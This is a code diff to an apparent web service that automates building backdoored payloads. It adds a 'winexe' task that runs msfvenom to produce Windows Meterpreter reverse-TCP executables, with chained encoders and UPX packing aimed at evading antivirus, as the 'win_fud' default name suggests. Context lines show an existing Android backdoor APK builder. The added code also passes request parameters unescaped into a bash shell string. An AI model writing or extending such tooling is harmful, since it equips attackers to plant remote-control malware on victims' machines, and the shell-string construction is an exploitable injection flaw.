@@ -214,9 +214,76 @@ def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
     _finalize_task(t, base, succeeded=(rc == 0 or (base / "output" / "app_backdoor.apk").exists()), err=None if (base / "output" / "app_backdoor.apk").exists() else f"backdoor_apk rc={rc}")
 
 
+def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    arch = params.get("arch", "x86")  # x86|x64
+    output_name = params.get("output_name", "win_fud")
+    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
+    upx_flag = params.get("upx", "false").lower() == "true"
+
+    exe_path = base / "output" / f"{output_name}.exe"
+
+    # build msfvenom pipeline
+    ven_cmd = [
+        "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
+        "-f", "raw"
+    ]
+    # Apply encoder chain
+    pipeline = []
+    if encoders.strip():
+        # first stage
+        stages = [e.strip() for e in encoders.split(",") if e.strip()]
+        # build a chain of msfvenom calls consuming raw input
+        for i, st in enumerate(stages):
+            parts = st.split(":")
+            enc = parts[0]
+            it = parts[1] if len(parts) > 1 else "1"
+            # for first pass read from previous, else still from previous stage
+            # We will construct shell pipeline string for simplicity
+        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
+        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
+        for st in stages:
+            p = st.split(":")
+            enc = p[0]
+            it = p[1] if len(p) > 1 else "1"
+            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
+        # final conversion to exe
+        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
+        cmd = ["bash", "-lc", chain]
+    else:
+        # single pass directly to exe
+        cmd = [
+            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
+            "-a", ("x86" if arch == "x86" else "x64"), "--platform", "windows",
+            "-f", "exe", "-o", str(exe_path)
+        ]
+
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    rc = _spawn(cmd, build_log)
+
+    # optional upx
+    if rc == 0 and upx_flag and exe_path.exists():
+        try:
+            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+        except Exception:
+            pass
+
+    succeeded = (rc == 0 and exe_path.exists())
+    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")
+
+
 # API models
 class CreateTaskRequest(BaseModel):
-    kind: str  # payload|listener|android
+    kind: str  # payload|listener|android|winexe
     params: Dict[str, str] = {}
 
 class TaskResponse(BaseModel):
@@ -225,7 +292,7 @@ class TaskResponse(BaseModel):
 
 @app.post("/tasks", response_model=TaskResponse)
 def create_task(req: CreateTaskRequest):
-    if req.kind not in ("payload", "listener", "android"):
+    if req.kind not in ("payload", "listener", "android", "winexe"):
         raise HTTPException(status_code=400, detail="Unsupported kind")
     t, base = _prepare_task(req.kind, req.params)
     # seed defaults
@@ -245,6 +312,8 @@ def create_task(req: CreateTaskRequest):
             run_listener_task(t.id, base, t.params)
         elif req.kind == "android":
             run_android_task(t.id, base, t.params)
+        elif req.kind == "winexe":
+            run_winexe_task(t.id, base, t.params)
     threading.Thread(target=runner, daemon=True).start()
     return TaskResponse(task=t)
 
